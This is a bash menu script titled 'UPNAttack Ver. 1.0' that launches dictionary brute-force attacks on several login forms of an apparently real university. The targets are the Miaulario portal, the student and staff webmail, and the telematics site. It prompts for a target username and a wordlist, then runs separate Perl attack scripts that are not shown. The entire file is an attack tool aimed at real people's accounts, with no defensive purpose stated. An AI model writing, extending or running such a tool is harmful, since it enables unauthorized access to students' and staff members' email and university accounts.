#!/bin/bash
# Bash Menu Script Example
clear
echo "*******************************************************************"
echo "*     __   _ _____  ___   _  __   _   _                           *"
echo "*    / /  / /  __ \/   | / / , |_| |_| |_   ____   ___  _  __     *"
echo "*   / /  / / /__/ / /| |/ / /| |_  __| __| / _, | / __|| |/ /     *" 
echo "*  / /__/ / /----/ / | | / /_| | | | | |  | (_| || (__ |  -|      *"
echo "* //\____/_/    /_/  |__/_/  |_| \__\ \__\ \__,_| \___||_|\_\     *"
echo "*                                                                 *"
echo "* UPNAttack Ver. 1.0                                              *"
echo "*******************************************************************"
echo ""
echo "-------    Tool to brute force attack the upna web forms     ------"
echo "                                                                                "
echo ""
echo ""
echo "1.Miaulario: Force brute the web form of miaulario website."
echo "2.CorreoA: Force brute the mail web form of the mail students website (ALUMNOS)."
echo "3.correoP: Force brute the mail web form of the administrative personal website (PAS-ADI)."
echo "4.TLM: Force brute the main login web form, of the telematics website." 
echo "5.Quit: To exit the script."
echo ""
echo ""
echo "CHOOSE ONE WEB FORM TO ATTACK"
PS3='Please enter your choice:'
echo -e "\n"
echo ""
options=("Miaulario" "CorreoA" "CorreoP" "Telematica" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Miaulario")
            echo ""
            echo "[+] Insert the target username:"
            read username
            echo ""
            echo "[+] Insert the dictionary file path"
            read dictionary
            echo ""
            echo ""
            echo "[+]Setting $username as target and executing attack"
            echo "[+]You will be informed every 100 tested passwords"
            echo "[+]Please wait..." 
            echo ""
            perl miaulario.pl $username $dictionary
            break
            ;;
        "CorreoA")
            echo ""
            echo "[+] Insert the target username:"
            read username
            echo ""
            echo "[+] Insert the dictionary file path"
            read dictionary
            echo ""
            echo "[+]Setting $username as target and executing attack"
            echo "[+]You will be informed every 100 tested passwords"
            echo "[+]Please wait..." 
            echo ""
            perl correoA.pl $username $dictionary
            break
            ;;
        "CorreoP")
            echo ""
            echo "[+] Insert the target username:"
            read username
            echo ""
            echo "[+] Insert the dictionary file path"
            read dictionary
            echo ""
            echo "[+]Setting $username as target and executing attack"
            echo "[+]You will be informed every 100 tested passwords"
            echo "[+]Please wait..." 
            echo ""
            perl correoP.pl $username $dictionary
            break
            ;;
        "Telematica")
            echo ""
            echo "[+] Insert the target username:"
            read username
            echo ""
            echo "[+] Insert the dictionary file path"
            read dictionary
            echo ""
            echo ""
            echo "[+]Setting $username as target and executing attack"
            echo "[+]You will be informed every 100 tested passwords"
            echo "[+]Please wait..." 
            echo ""
            perl tlm.pl $username $dictionary
            break
            ;;
        "Quit")
            clear
            break
            ;;
        *) echo invalid option;;
    esac
done
echo ""
